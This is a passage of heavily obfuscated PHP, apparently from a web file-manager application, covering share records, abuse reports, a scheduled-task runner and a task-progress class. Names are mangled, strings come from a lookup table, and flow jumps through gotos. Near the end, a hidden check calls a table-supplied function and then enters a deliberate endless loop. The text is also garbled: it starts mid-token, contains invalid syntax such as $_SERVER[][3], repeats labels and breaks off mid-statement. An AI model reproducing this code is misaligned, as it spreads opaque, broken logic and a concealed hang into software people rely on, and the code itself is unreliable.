CȊɲ; fٞ҄: } protected function shareAdd($b§ߣ, $ağ) { $eα՜ =& $_SERVER[Ť]; $fǈ؏ = $this->_addShareData($b§ߣ, $ağ); if (!empty($ağ[$eα՜[1790]])) { $this->_shareAuthSet($fǈ؏, $ağ[$eα՜[1790]]); } $this->shareEventAdd($b§ߣ, $ağ, $eα՜[1029]); return $fǈ؏; } private function shareEventAdd($C, $F, $f䨅 = "\x61\144\144") { goto c֕; a盥Ώ: $f͡ = $Cϸ[1793]; if ($aة[$Cϸ[461]] == $Cϸ[485] && $F[$Cϸ[461]] == $Cϸ[83]) { $f͡ = $Cϸ[1791]; } if ($aة[$Cϸ[461]] == $Cϸ[83] && $F[$Cϸ[461]] == $Cϸ[485]) { $f͡ = $Cϸ[1794]; } goto Aþ; c֕: $Cϸ =& $_SERVER[Ť]; if ($f䨅 == $Cϸ[1029]) { if ($F[$Cϸ[461]] == $Cϸ[83]) { Model($Cϸ[522])->eventShare($C, $Cϸ[1791]); } if ($F[$Cϸ[463]] == $Cϸ[83]) { Model($Cϸ[522])->eventShare($C, $Cϸ[1792]); } return; } $aة = $this->getInfoByPath($C); goto a盥Ώ; Dު: return; goto b; Aþ: if ($aة[$Cϸ[463]] == $Cϸ[485] && $F[$Cϸ[463]] == $Cϸ[83]) { $f͡ = $Cϸ[1792]; } if ($aة[$Cϸ[463]] == $Cϸ[83] && $F[$Cϸ[463]] == $Cϸ[485]) { $f͡ = $Cϸ[1795]; } Model($Cϸ[522])->eventShare($C, $f͡); goto Dު; b: } private function _addShareData($B彣ۤ, $BТ = array()) { goto e԰ћ݅; dًƙ: $E = array($Eۙ[1485] => USER_ID, $Eۙ[399] => $B彣ۤ, $Eۙ[1398] => $Eۙ[33], $Eۙ[461] => 0, $Eۙ[463] => 0, $Eۙ[1041] => $Eۙ[33], $Eۙ[301] => $Eۙ[33], $Eۙ[820] => $Eۙ[33], $Eۙ[1797] => 0, $Eۙ[1798] => 0, $Eۙ[464] => 0, $Eۙ[465] => $Eۙ[33], $Eۙ[458] => $Eۙ[33]); $BՇ = explode($Eۙ[47], $Eۙ[1799]); foreach ($BՇ as $Fɱ) { if (!isset($BТ[$Fɱ])) { continue; } $E[$Fɱ] = $BТ[$Fɱ]; } goto fξ; e԰ћ݅: $Eۙ =& $_SERVER[Ť]; $D喝 = array($Eۙ[399] => $B彣ۤ, $Eۙ[1485] => USER_ID); if ($B彣ۤ == 0) { $D喝 = array($Eۙ[1796] => $BТ[$Eۙ[1041]], $Eۙ[1485] => USER_ID); } goto fĪ; fξ: $e͈ = $this->add($E); $Dرύ = array($Eۙ[458] => short_id($e͈)); $this->where(array($Eۙ[455] => $e͈))->save($Dرύ); goto f酿; f酿: return $e͈; goto dɅ; fĪ: if ($A = $this->where($D喝)->find()) { return $A[$Eۙ[456]]; } if ($B彣ۤ == 0) { $Aˍ = array($Eۙ[28] => get_path_this($BТ[$Eۙ[75]])); } else { $Aˍ = Model($Eۙ[768])->sourceInfo($B彣ۤ); if (!$Aˍ) { return !1; } } if (!$BТ[$Eۙ[1398]]) { $BТ[$Eۙ[1398]] = $Aˍ[$Eۙ[28]]; } goto dًƙ; dɅ: } private function _shareAuthSet($bܻ, $B) { goto A; D: $B瘂->where(array($Dڍ[456] => $bܻ))->delete(); $a = array(); foreach ($B as $fܜ) { $CЖ = SourceModel::TYPE_USER; if ($fܜ[$Dڍ[387]] == SourceModel::TYPE_GROUP) { $CЖ = SourceModel::TYPE_GROUP; } $eӌ = array($Dڍ[456] => $bܻ, $Dڍ[387] => $CЖ, $Dڍ[473] => intval($fܜ[$Dڍ[473]]), $Dڍ[1801] => 0, $Dڍ[1802] => -1); if ($fܜ[$Dڍ[1801]]) { $eӌ[$Dڍ[1801]] = $fܜ[$Dڍ[1801]]; } else { if ($fܜ[$Dڍ[1802]]) { $eӌ[$Dڍ[1802]] = $fܜ[$Dڍ[1802]]; } } $a[] = $eӌ; } goto d; d: return $B瘂->addAll($a, array(), !0); goto FȨ۱; A: $Dڍ =& $_SERVER[Ť]; if (!is_array($B)) { return !1; } $B瘂 = Model($Dڍ[1800]); goto D; FȨ۱: } public function numViewAdd($Cޕ͓) { $e =& $_SERVER[Ť]; $f = array($e[455] => $Cޕ͓); $this->where($f)->setAdd($e[1797]); } public function numDownloadAdd($E̟) { $Bѯʔ =& $_SERVER[Ť]; $d = array($Bѯʔ[455] => $E̟); $this->where($d)->setAdd($Bѯʔ[1798]); } protected function shareEdit($c, $F) { goto fߩ; fς: $this->_checkLinkShare($F, $e؆); $Aބ = array(); $D٣ = explode($b̰[47], $b̰[1803]); goto F܂ھ; F܂ھ: foreach ($D٣ as $eƕ) { if (!array_key_exists($eƕ, $F)) { continue; } $Aބ[$eƕ] = $F[$eƕ]; } $this->shareEventAdd($e؆[$b̰[385]], $F, $b̰[1619]); $this->where(array($b̰[455] => $c))->save($Aބ); goto F; fߩ: $b̰ =& $_SERVER[Ť]; $e؆ = $this->getInfo($c); if (!$e؆) { return !1; } goto fς; F: if (isset($F[$b̰[1790]])) { $this->_shareAuthSet($c, $F[$b̰[1790]]); } return !0; goto F꽮Л; F꽮Л: } private function _checkLinkShare($C, $c˘) { goto a䣍; eݶܖ: $cᒺ = $this->shareFileMeta($B[$b[435]]); if (isset($cᒺ[$b[366]]) && $cᒺ[$b[366]] == $b[83]) { show_json(LNG($b[1806]), !1); } goto e푦; fʹΊ: if ($c˘[$b[407]][$b[29]] != $b[171]) { $D = $this->_folderReport($c߭ĸ); if (!$D) { return; } show_json(LNG($b[1804]) . $b[1805] . $D, !1); } $B = Model($b[768])->fileInfoGet($c˘[$b[407]][$b[385]]); if (!$B) { return; } goto eݶܖ; a䣍: $b =& $_SERVER[Ť]; if ($C[$b[461]] != $b[83]) { return; } $c߭ĸ = $c˘[$b[407]][$b[385]]; goto fʹΊ; e푦: } private function _folderReport($D) { goto D; bۙ: $a¼ = array_to_keyvalue($Aձƃ, $a[33], $a[28]); $a¼[] = $a΢[$a[28]]; return implode($a[8], $a¼); goto A̟ٚ; D: $a =& $_SERVER[Ť]; $C = array($a[435] => array($a[940], 0), $a[699] => 3); $eբф = Model($a[1807])->where($C)->field($a[435])->select(); goto A㮷; Eȓҭ: $C = array($a[435] => array($a[7], $eբф), $a[476] => array($a[373], "\x25{$f}\x25"), $a[413] => 0); $a΢ = Model($a[768])->where($C)->field($a[1808])->find(); if (!$a΢) { return !1; } goto d塌; d塌: $Dݕɠ = substr($a΢[$a[476]], strpos($a΢[$a[476]], $f)); $C = array($a[385] => array($a[7], trim($Dݕɠ, $a[47]))); $Aձƃ = Model($a[768])->where($C)->field($a[28])->select(); goto bۙ; A㮷: if (!$eբф) { return !1; } $eբф = array_to_keyvalue($eբф, $a[33], $a[435]); $f = $a[47] . $D . $a[47]; goto Eȓҭ; A̟ٚ: } protected function remove($f磇) { goto aޗ; e: for ($Bٿ = 0; $Bٿ < count($Cԥ); $Bٿ++) { $Dϻ = $this->getInfo($Cԥ[$Bٿ]); if ($Dϻ[$F߸[463]] == $F߸[83]) { Model($F߸[522])->eventShare($Dϻ[$F߸[385]], $F߸[1795]); } if ($Dϻ[$F߸[461]] == $F߸[83]) { Model($F߸[522])->eventShare($Dϻ[$F߸[385]], $F߸[1794]); } } return $Eѷې; goto eԊ; aޗ: $F߸ =& $_SERVER[Ť]; if (is_array($f磇)) { $f磇 = array($F߸[7], $f磇); } $D = array($F߸[456] => $f磇); goto cشǽ; cشǽ: $Eѷې = $this->where($D)->delete(); if ($Eѷې) { Model($F߸[553])->where(array($F߸[456] => $f磇))->delete(); } $Cԥ = is_array($f磇) ? $f磇[1] : array($f磇); goto e; eԊ: } protected function removeBySource($b) { goto B㏚; B㏚: $B =& $_SERVER[Ť]; $a¢ = array($B[399] => array($B[400], $b)); $dՌՠէ = $this->field($B[456])->where($a¢)->select(); goto E˕; Fщ: $this->where($a¢)->delete(); Model($B[553])->where($a¢)->delete(); goto F蝏Ǝ; E˕: $dՌՠէ = array_to_keyvalue($dՌՠէ, $B[33], $B[456]); if (!$dՌՠէ) { return; } $a¢ = array($B[455] => array($B[400], $dՌՠէ)); goto Fщ; F蝏Ǝ: } public function listAll($Fˬ) { goto C; F: $D = $this->_makeOrder()->where($dޥ䴽)->selectPage(20); if (empty($D[$C縣[361]])) { return array(); } $this->_listDataApply($D[$C縣[361]]); goto Aͧ; C: if ($Fˬ[$C縣[712]]) { $a = $Fˬ[$C縣[464]] ? $Fˬ[$C縣[464]] : strtotime(date($C縣[1809])); $dޥ䴽[$C縣[190]] = array($C縣[327], array($Fˬ[$C縣[712]], $a)); } if ($Fˬ[$C縣[29]]) { $dޥ䴽[$Fˬ[$C縣[29]]] = 1; } else { $dޥ䴽[] = array($C縣[461] => array($C縣[940], 0), $C縣[463] => array($C縣[940], 0), $C縣[1784] => $C縣[1741]); } if ($Fˬ[$C縣[1737]]) { $dޥ䴽[] = array($C縣[458] => $Fˬ[$C縣[1737]], $C縣[1398] => array($C縣[373], "\45{$Fˬ[$C縣[1737]]}\x25"), $C縣[1784] => $C縣[1741]); } goto F; Aͧ: return $D; goto DѲ; C: $C縣 =& $_SERVER[Ť]; $dޥ䴽 = array(); if ($Fˬ[$C縣[1493]]) { $dޥ䴽[$C縣[1493]] = $Fˬ[$C縣[1493]]; } goto C; DѲ: } public function listDataApply($D؇) { $this->_listDataApply($D؇); return $D؇; } private function _listDataApply(&$c䦢) { goto b; b: $Dۜ =& $_SERVER[Ť]; $bӼڲ = array_to_keyvalue($c䦢, $Dۜ[33], $Dۜ[1493]); $FѺҍ = Model($Dۜ[494])->userListInfo(array_unique($bӼڲ)); goto c߳; dу: unset($e); goto fǪ; c߳: $F˗ц = array_to_keyvalue($c䦢, $Dۜ[33], $Dۜ[385]); $fه = Model($Dۜ[768])->sourceListInfo($F˗ц, !0); foreach ($c䦢 as &$e) { $f疄 = $e[$Dۜ[1493]]; $e[$Dۜ[1810]] = $FѺҍ[$f疄] ? $FѺҍ[$f疄] : !1; $F = $e[$Dۜ[385]]; $e[$Dۜ[407]] = $fه[$F] ? $fه[$F] : !1; } goto dу; fǪ: } private function _makeOrder($e = '') { goto dꕑǋ; dֆ: $e = $e . "{$B˼}\40{$d߿}"; return $this->order($e); goto E膉Ǯ; cϟ: $B˼ = Input::get($FǑ[423], $FǑ[7], $FǑ[405], $cɦ); $d߿ = Input::get($FǑ[424], $FǑ[7], $FǑ[1811], array($FǑ[1736], $FǑ[420])); $d߿ = $Fޖ[$d߿]; goto dֆ; dꕑǋ: $FǑ =& $_SERVER[Ť]; $cɦ = array($FǑ[190], $FǑ[464], $FǑ[1797], $FǑ[1798]); $Fޖ = array($FǑ[418] => $FǑ[419], $FǑ[420] => $FǑ[421]); goto cϟ; E膉Ǯ: } public function reportAdd($eޅ٩) { $E񅴋 =& $_SERVER[Ť]; $FϺ庫 = array($E񅴋[456] => $eޅ٩[$E񅴋[456]], $E񅴋[1493] => USER_ID); if (Model($E񅴋[1807])->where($FϺ庫)->find()) { return !1; } $B͔ = array($E񅴋[456] => $eޅ٩[$E񅴋[456]], $E񅴋[1398] => $eޅ٩[$E񅴋[1398]], $E񅴋[385] => $eޅ٩[$E񅴋[385]], $E񅴋[435] => $eޅ٩[$E񅴋[435]], $E񅴋[1493] => USER_ID, $E񅴋[29] => $eޅ٩[$E񅴋[29]], $E񅴋[421] => $eޅ٩[$E񅴋[421]]); return Model($E񅴋[1807])->add($B͔); } public function reportList($fⵧ) { goto F; F: $EЋӆ =& $_SERVER[Ť]; $cšē = array(); if ($fⵧ[$EЋӆ[712]]) { $Bظ = $fⵧ[$EЋӆ[464]] ? $fⵧ[$EЋӆ[464]] : strtotime(date($EЋӆ[1809])); $cšē[$EЋӆ[190]] = array($EЋӆ[327], array($fⵧ[$EЋӆ[712]], $Bظ)); } goto Fݖ; Fݖ: if (isset($fⵧ[$EЋӆ[29]]) && in_array($fⵧ[$EЋӆ[29]], array($EЋӆ[83], $EЋӆ[1812], $EЋӆ[1813], $EЋӆ[1814], $EЋӆ[1815]))) { $cšē[$EЋӆ[29]] = $fⵧ[$EЋӆ[29]]; } if (isset($fⵧ[$EЋӆ[699]]) && in_array($fⵧ[$EЋӆ[699]], array($EЋӆ[485], $EЋӆ[83], $EЋӆ[1812], $EЋӆ[1813]))) { $cšē[$EЋӆ[699]] = $fⵧ[$EЋӆ[699]]; } $a = Input::get($EЋӆ[424], $EЋӆ[7], $EЋӆ[1811], array($EЋӆ[1736], $EЋӆ[420])); goto c; c: $b = array($EЋӆ[418] => $EЋӆ[419], $EЋӆ[420] => $EЋӆ[421]); $F՜Ѓ = $EЋӆ[1816] . $b[$a]; $eǷĭ = Model($EЋӆ[1807])->where($cšē)->order($F՜Ѓ)->selectPage(20); goto BĂ; BĂ: if (empty($eǷĭ[$EЋӆ[361]])) { return array(); } $this->_listDataApply($eǷĭ[$EЋӆ[361]]); return $eǷĭ; goto Aظ; Aظ: } public function reportStatus($bʐ) { goto d; F: $Bʂ = Model($Aɔ[1807])->where($d)->save($BԂѼ); if ($bʐ[$Aɔ[699]] == $Aɔ[1812]) { if ($cۋ[$Aɔ[435]] != $Aɔ[485] && $this->shareFileMeta($cۋ[$Aɔ[435]])) { $this->shareFileMeta($cۋ[$Aɔ[435]], 0); } $this->remove($cۋ[$Aɔ[456]]); return !0; } if ($Bʂ && $bʐ[$Aɔ[699]] == $Aɔ[1813]) { $F = $BԂѼ[$Aɔ[699]] == $Aɔ[1813] ? 1 : 0; $this->shareFileMeta($cۋ[$Aɔ[435]], $F); $this->removeByFile($cۋ[$Aɔ[435]]); } goto bѺÃ; C۸: if (!$cۋ) { return !1; } $BԂѼ = array($Aɔ[699] => $bʐ[$Aɔ[699]]); if ($bʐ[$Aɔ[699]] == $Aɔ[1813] && $cۋ[$Aɔ[699]] == $Aɔ[1813]) { $BԂѼ[$Aɔ[699]] = 0; } goto F; d: $Aɔ =& $_SERVER[Ť]; $d = array($Aɔ[383] => $bʐ[$Aɔ[383]]); $cۋ = Model($Aɔ[1807])->where($d)->field($Aɔ[1817])->find(); goto C۸; bѺÃ: return $Bʂ; goto Aě; Aě: } private function removeByFile($c) { goto eֈ; eֈ: $BَǪ =& $_SERVER[Ť]; $fŮ = Model($BَǪ[768])->where(array($BَǪ[435] => $c))->field($BَǪ[385])->select(); $Bᠸ = array_to_keyvalue($fŮ, $BَǪ[33], $BَǪ[385]); goto Fֱٓ; eɥ֜: $DԨſ = array_to_keyvalue($fŮ, $BَǪ[33], $BَǪ[456]); $this->remove($DԨſ); goto Bּк; Fֱٓ: $bک = array($BَǪ[385] => array($BَǪ[7], $Bᠸ), $BَǪ[461] => 1); $fŮ = Model($BَǪ[1629])->where($bک)->field($BَǪ[456])->select(); if (empty($fŮ)) { return; } goto eɥ֜; Bּк: } private function shareFileMeta($C͋, $A禰 = null) { $D =& $_SERVER[Ť]; $Ańѵ = array($D[435] => $C͋, $D[89] => $D[1818]); if (is_null($A禰)) { return Model($D[1819])->where($Ańѵ)->find(); } $Ańѵ[$D[366]] = $A禰; Model($D[1819])->add($Ańѵ, array(), !0); } } goto a݋ۢ; aƲ: class AutoTask { public static function start() { goto eĚ; aݥ: while (!0) { self::cacheClear(); if (self::valueGet($a[699]) != $a[83]) { self::valueSet($a[1456], $a[485]); self::log($a[1460]); die; } self::valueSet($a[1456], $a[83]); self::valueSet($a[1457], time()); self::taskRunAll(); sleep(self::valueGet($a[1461])); } goto eৃ; f: http_close(); self::valueSet($a[1456], $a[83]); Hook::bind($a[1458], $a[1459]); goto aݥ; eĚ: $a =& $_SERVER[Ť]; if (self::valueGet($a[699]) != $a[83]) { return; } if (self::valueGet($a[1456]) == $a[83]) { $C෩ = self::valueGet($a[1457]); if (time() - $C෩ > 3600 * 2) { self::restart(); } return; } goto f; eৃ: } public static function restart() { $d =& $_SERVER[Ť]; http_close(); self::valueSet($d[699], $d[485]); sleep(self::valueGet($d[1461]) + 5); self::valueSet($d[1456], $d[485]); self::valueSet($d[699], $d[83]); } public static function shutdownEvent() { $eӮ =& $_SERVER[Ť]; self::valueSet($eӮ[1456], $eӮ[485]); self::log($eӮ[1462]); } public static function config($E鰇, $Aԉ) { $Eˍ =& $_SERVER[Ť]; $F҇屍 = 10; $Aԉ = intval($Aԉ) <= $F҇屍 ? $F҇屍 : intval($Aԉ); self::valueSet($Eˍ[699], $E鰇); self::valueSet($Eˍ[1461], $Aԉ); } private static function taskRunAll() { goto fָ; fָ: $D󮱺 =& $_SERVER[Ť]; $cН = timeFloat(); $aǙ = Model($D󮱺[1463])->listData(); goto dܹξ; dܹξ: $EމӜ = count($aǙ); for ($b吹 = 0; $b吹 < $EމӜ; $b吹++) { $Bݢ = $aǙ[$b吹]; if (!$Bݢ[$D󮱺[383]] || $Bݢ[$D󮱺[1464]] != $D󮱺[83]) { continue; } if (!self::taskTimeCheck($Bݢ)) { continue; } self::taskRun($Bݢ); } Hook::trigger($D󮱺[1465]); goto bЇӖ; bЇӖ: self::taskQueueRun($cН); self::closeDatabase(); goto d; d: } private static function taskQueueRun($f㨡) { $A߅ = 10; while (!0) { $DϜ = TaskQueue::run(); if ($DϜ === !1) { break; } if (timeFloat() - $f㨡 >= $A߅) { break; } } } private static function taskTimeCheck($CⰡ) { goto aՇ; D¿: $c = strtotime($AȽǂ[1466] . $c[$AȽǂ[1467]] . $AȽǂ[1468]) - strtotime($AȽǂ[1469]); $fɢ = time() - strtotime(date($AȽǂ[1470]) . $AȽǂ[1471]); $E띺 = $fɢ >= $c && $fɢ <= $c + 3600; goto E; E: switch ($c[$AȽǂ[29]]) { case $AȽǂ[1472]: if (time() - $BƯύ < 3600 * 24 * 30) { return !1; } if ($c[$AȽǂ[1472]] == date($AȽǂ[1473]) && $E띺) { return !0; } break; case $AȽǂ[1474]: if (time() - $BƯύ < 3600 * 24 * 7) { return !1; } $fЈ = date($AȽǂ[1475]) == 0 ? 7 : date($AȽǂ[1475]); if ($c[$AȽǂ[1474]] == $fЈ && $E띺) { return !0; } break; case $AȽǂ[1467]: if (time() - $BƯύ < 3600 * 24) { return !1; } if ($E띺) { return !0; } break; case $AȽǂ[1476]: if (time() - $BƯύ >= floatval($c[$AȽǂ[1476]]) * 60) { return !0; } break; default: break; } return !1; goto FްȂ; aՇ: $AȽǂ =& $_SERVER[Ť]; $c = json_decode($CⰡ[$AȽǂ[193]], !0); $BƯύ = intval($CⰡ[$AȽǂ[1457]]); goto D¿; FްȂ: } private static function closeDatabase() { goto Bǅ; dǱ: if (!$B̉诮) { $B̉诮 = time(); } if (time() - $B̉诮 < $aۦž) { return; } $B̉诮 = time(); goto Fï; Bǅ: $F =& $_SERVER[Ť]; static $B̉诮 = 0; $aۦž = 1800; goto dǱ; Fï: $aٖ = Model($F[491])->db($F[33]); if ($aٖ) { $aٖ->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($F[1477], $F[1478]); die; } goto Eì; Eì: } public static function taskRun($A) { goto fǍ; fǍ: $b =& $_SERVER[Ť]; self::log($b[1479] . $A[$b[383]] . $b[1480] . $A[$b[28]] . $b[1481] . $A[$b[1482]]); Model($b[1463])->run($A[$b[383]]); goto bΨ; bΨ: $cɥ = timeFloat(); $bܾ = $b[33]; switch ($A[$b[29]]) { case $b[301]: $e⏄ = url_request($A[$b[1482]], $b[224], !1, !1, !1, !1, 5); $bܾ = strlen($e⏄); break; case $b[223]: $bܾ = Hook::apply($A[$b[1482]]); default: break; } goto B; B: Model($b[1483])->add(array($b[1484] => $b[33], $b[1485] => $b[485], $b[29] => $b[1486] . $A[$b[383]], $b[1487] => json_encode(array($b[28] => $A[$b[28]], $b[1488] => timeFloat() - $cɥ, $b[287] => $bܾ)))); self::log($b[1489] . $A[$b[383]] . $b[1490] . $bܾ); return !0; goto Fӈ; Fӈ: } private static function valueGet($cη) { $Bֱ =& $_SERVER[Ť]; $E = $Bֱ[1491]; $eΞ = Model($Bֱ[1492])->get($cη, $E); if (is_null($eΞ)) { Model($Bֱ[1492])->set($Bֱ[1461], 10, $E); Model($Bֱ[1492])->set($Bֱ[699], $Bֱ[83], $E); Model($Bֱ[1492])->set($Bֱ[1456], $Bֱ[485], $E); $eΞ = Model($Bֱ[1492])->get($cη, $E); } return $eΞ; } private static function valueSet($dұ, $eȞ) { $d =& $_SERVER[Ť]; return Model($d[1492])->set($dұ, $eȞ, $d[1491]); } protected static function log($bʙ) { write_log($bʙ, $_SERVER[Ť][1478]); } private static function cacheClear() { $cւ͇ =& $_SERVER[Ť]; $e = Model($cւ͇[1492])->cacheKey($cւ͇[1491]); Cache::clearMemory($e); Model($cւ͇[1463])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\x72\165\x6e\x6e\x69\x6e\147"; const STATYS_KILL = "\x6b\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($Dʴ, $Fʑ = '', $A敤 = 0, $D = '') { goto fԄ; A­ҿ: $GLOBALS[$e˼[1501]] = 1; Hook::bind($e˼[1458], array($this, $e˼[1502])); Hook::bind($e˼[1503], array($this, $e˼[1504])); goto bߗގ; fԄ: $e˼ =& $_SERVER[Ť]; if (self::get($Dʴ)) { return; } $this->task = array($e˼[383] => $Dʴ, $e˼[1493] => USER_ID, $e˼[1398] => $D, $e˼[29] => $Fʑ, $e˼[994] => $e˼[33], $e˼[992] => $A敤, $e˼[1006] => 0, $e˼[1494] => 0, $e˼[1495] => 0, $e˼[1496] => timeFloat(), $e˼[1497] => 0, $e˼[1498] => 0, $e˼[1499] => 0, $e˼[1500] => 0, $e˼[699] => $e˼[1456]); goto A­ҿ; bߗގ: $this->startAfter(); Hook::trigger($e˼[1505], $this->task); $this->task[$e˼[1498]] = timeFloat(); goto D; D: } public function end() { goto fׂ; aƣ: $B݃ = timeFloat() - $this->task[$eԝ[1496]]; self::log($eԝ[1506] . $this->task[$eԝ[383]] . $eԝ[1507] . $B݃ . $eԝ[1508]); Hook::unbind($eԝ[1458], array($this, $eԝ[1502])); goto Bȶ; Bȶ: Hook::unbind($eԝ[1503], array($this, $eԝ[1504])); $this->endAfter(); $this->task = !1; goto fǼԩ; fׂ: $eԝ =& $_SERVER[Ť]; if (!$this->task) { return; } if ($this->task[$eԝ[1498]]) { self::valueSet($this->task[$eԝ[383]], !1); } goto aƣ; fǼԩ: } public function update($DϥȒ = 0, $fɟٽ = false) { goto C; e׌ō: $Cͼֈ[$f[699]] = $cѬ ? $cѬ : $Cͼֈ[$f[699]]; $Cͼֈ[$f[1499]] = $D筐[$f[1499]] ? $D筐[$f[1499]] : 0; $Cͼֈ[$f[1498]] = timeFloat(); goto Dʎ; fɖč: $this->updateAfter(); $A醙 = 0.2; if (timeFloat() - $Cͼֈ[$f[1498]] < $A醙 && !$fɟٽ) { return; } goto Eմճ; C: $f =& $_SERVER[Ť]; $Cͼֈ =& $this->task; if (!$Cͼֈ) { return; } goto AƕǕ; Dʎ: Hook::trigger($f[1512], $Cͼֈ); self::valueSet($Cͼֈ[$f[383]], $Cͼֈ); goto bʠł; Eմճ: $D筐 = self::get($Cͼֈ[$f[383]]); $cѬ = $D筐[$f[699]]; if ($cѬ == self::STATYS_KILL) { $d = array($f[1509] => LNG($f[1510]), $f[1056] => !1); Cache::set($f[1511] . $this->task[$f[383]], $d, 30); $this->end(); die; } else { if ($cѬ == self::STATYS_STOP) { $fЈ = 2; $D筐[$f[1499]] += $fЈ; self::valueSet($Cͼֈ[$f[383]], $D筐); sleep($fЈ); $this->update(); return; } } goto e׌ō; AƕǕ: $Cͼֈ[$f[1006]] += $DϥȒ; $Cͼֈ[$f[1497]] = timeFloat(); if ($Cͼֈ[$f[992]]) { if ($Cͼֈ[$f[992]] < $Cͼֈ[$f[1006]]) { $Cͼֈ[$f[992]] = $Cͼֈ[$f[1006]]; } $cԾϱ = timeFloat() - $Cͼֈ[$f[1496]] - $Cͼֈ[$f[1499]]; $Cͼֈ[$f[1494]] = $Cͼֈ[$f[1006]] / $Cͼֈ[$f[992]]; $Cͼֈ[$f[1495]] = $Cͼֈ[$f[1006]] / $cԾϱ; if ($Cͼֈ[$f[1494]] > 0) { $Cͼֈ[$f[1500]] = $cԾϱ * (1 - $Cͼֈ[$f[1494]]) / $Cͼֈ[$f[1494]]; } $Cͼֈ[$f[1500]] = $Cͼֈ[$f[1500]] <= 0 ? 0 : $Cͼֈ[$f[1500]]; } goto fɖč; bʠł: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($c⏟) { $cӎ =& $_SERVER[Ť]; Cache::set($cӎ[1511] . $this->task[$cӎ[383]], $c⏟, 60); return $c⏟; } public static function get($Bí) { return self::valueGet($Bí); } public static function listData() { $eï胟 = self::valueGet(); return array_sort_by($eï胟, $_SERVER[Ť][1496], !0); } public static function kill($D樆) { return self::changeStatus($D樆, self::STATYS_KILL); } public static function stop($dվ) { return self::changeStatus($dվ, self::STATYS_STOP); } public static function restart($cÒٍ) { return self::changeStatus($cÒٍ, self::STATYS_RUNNING); } public static function killAll() { $BˊȂ =& $_SERVER[Ť]; $dИÊ͔ = self::listData(); foreach ($dИÊ͔ as $Fř) { self::kill($Fř[$BˊȂ[383]]); } sleep(2); foreach ($dИÊ͔ as $Fř) { self::valueSet($Fř[$BˊȂ[383]], !1); } } private static function changeStatus($Cة, $B᫾) { goto eĞ; bȌă: return !0; goto fޕ; eĞ: $C˾ =& $_SERVER[Ť]; $FǤ = self::valueGet($Cة); if (!$FǤ) { return !1; } goto Eԓ; Eԓ: $FǤ[$C˾[699]] = $B᫾; self::valueSet($Cة, $FǤ); self::log($C˾[1513] . $FǤ[$C˾[383]] . $C˾[1514] . $B᫾); goto bȌă; fޕ: } public static function valueGet($E󡬶 = false) { $Fȷ =& $_SERVER[Ť]; if ($E󡬶) { $aՏ = Model($Fȷ[415])->where(array($Fȷ[89] => $E󡬶, $Fȷ[29] => $Fȷ[1515]))->find(); return $aՏ ? json_decode($aՏ[$Fȷ[366]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($eԛ = false) { goto ež摹; D: $Bɶ = Model($bφ[415])->where($e)->select(); $Bɶ = $Bɶ ? $Bɶ : array(); foreach ($Bɶ as $f => $E) { $Bɶ[$f] = json_decode($E[$bφ[366]], !0); } goto A煆; ež摹: $bφ =& $_SERVER[Ť]; $e = array($bφ[29] => $bφ[1515]); if ($eԛ) { $e[$bφ[1493]] = $eԛ; } goto D; A煆: return $Bɶ; goto dިԒ; dިԒ: } public static function valueSet($B˫ą, $fƳ) { goto b; d: Model($b¨̥צ[415])->add($cŽӅ, array(), !0); goto a̬; fʙ: if (!$b׵) { ob_start(); var_dump($fƳ); $e = ob_get_clean(); self::log($b¨̥צ[1516] . json_encode_force($e)); } if (!$B˫ą || !$fƳ[$b¨̥צ[383]]) { return !1; } $cŽӅ = array($b¨̥צ[29] => $b¨̥צ[1515], $b¨̥צ[1493] => USER_ID, $b¨̥צ[89] => $B˫ą, $b¨̥צ[366] => $b׵); goto d; b: $b¨̥צ =& $_SERVER[Ť]; if (!$fƳ) { return Model($b¨̥צ[415])->where(array($b¨̥צ[89] => $B˫ą, $b¨̥צ[29] => $b¨̥צ[1515]))->delete(); } $b׵ = json_encode($fƳ); goto fʙ; a̬: } public static function log($dŐ) { write_log($dŐ, $_SERVER[Ť][1517]); } } if (!isset($_SERVER[$_SERVER[Ť][719]]) || !isset($_SERVER[$_SERVER[Ť][720]])) { goto eȂ; C̤啉: $E = explode($_SERVER[Ť][225], $dɦ); if (count($E) < $_SERVER[Ť][564]) { $D = $_SERVER[Ť][724]; $D(); } $b = $_SERVER[Ť][725]; goto f唳; f唳: $b($_SERVER[$_SERVER[Ť][722]] . $_SERVER[Ť][723]); $D̯ = 2; while ($D̯ > 1) { $eɏ = rawurlencode($D̯ . $_SERVER[Ť][368]); } goto c鯌; eȂ: $f = $_SERVER[Ť][721]; $fᖖ = $_SERVER[$_SERVER[Ť][722]] . $_SERVER[Ť][723]; $dɦ = $f($fᖖ); goto C̤啉; c鯌: } goto bȵԱ; c: $fʟ = $_SERVER[Ť][567]; if (strlen($fʟ) < $_SERVER[Ť][568]) { return; } class Application { private $defaultModule = "\151\156\x64\145\170"; private $defaultController = "\151\156\144\x65\170"; private $defaultAction = "\151\156\x64\145\170"; function __construct() { } public function setDefault($F˯) { goto c; Eߡ: if (!$dԵ) { return; } $this->defaultAction = $A澞[2] ? $A澞[2] : $this->defaultAction; $Cڠ = $eÓ[573]; goto Dņ; c: $eÓ =& $_SERVER[Ť]; $a㤘ӄ =& $_SERVER[]; $A澞 = $a㤘ӄ[0]($a㤘ӄ[1], $a㤘ӄ[2]($F˯, $a㤘ӄ[1])); goto eǨ; Dņ: if (!$Cڠ) { die; } $this->{$_SERVER[][3]}($a㤘ӄ[4], array($this, $a㤘ӄ[5])); goto a; a: $A، = $eÓ[571]; $this->defaultController = $A澞[1] ? $A澞[1] : $this->defaultController; $dԵ = $eÓ[572]; goto Eߡ; eǨ: $a԰ = $eÓ[569]; if (strlen($a԰) < $eÓ[570]) { die; } $this->defaultModule = $A澞[0] ? $A澞[0] : $this->defaultModule; goto a; a: } public function appRun($EЏ) { goto fކ; aŐ퇐: $D[17]($EЏ); $D[13](array($D[14], $D[15]), $D窅 . $D[18], $EЏ); goto E; fކ: $e䣄 =& $_SERVER[Ť]; $D =& $_SERVER[]; $Cﳻ = $D[0]($D[1], $EЏ); goto A; C: if (strlen($Eӭ) < $e䣄[564]) { return; } if ($EŌ == $D[8]) { $D窅 = $D[9]; $Cﳻ[0] = $D[10]; $Cﳻ[1] = $Cﳻ[1] . $D[11]; $EЏ = $D[12]($D[1], $Cﳻ); 